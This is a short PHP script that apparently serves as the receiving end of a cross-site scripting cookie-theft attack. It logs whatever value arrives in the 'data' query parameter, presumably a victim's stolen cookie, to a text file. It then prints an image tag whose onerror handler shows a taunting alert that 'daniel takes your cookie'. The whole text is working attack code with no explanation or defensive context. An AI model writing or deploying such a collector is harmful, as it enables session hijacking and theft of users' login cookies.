<?

$cookie=$_GET['data'];
$log=fopen("data.txt","a");
fwrite($log," ".$cookie."\r\n");
fclose($log);
echo "<img src=\'0\' onerror=alert(\"daniel takes your cookie\")></img>";

?>
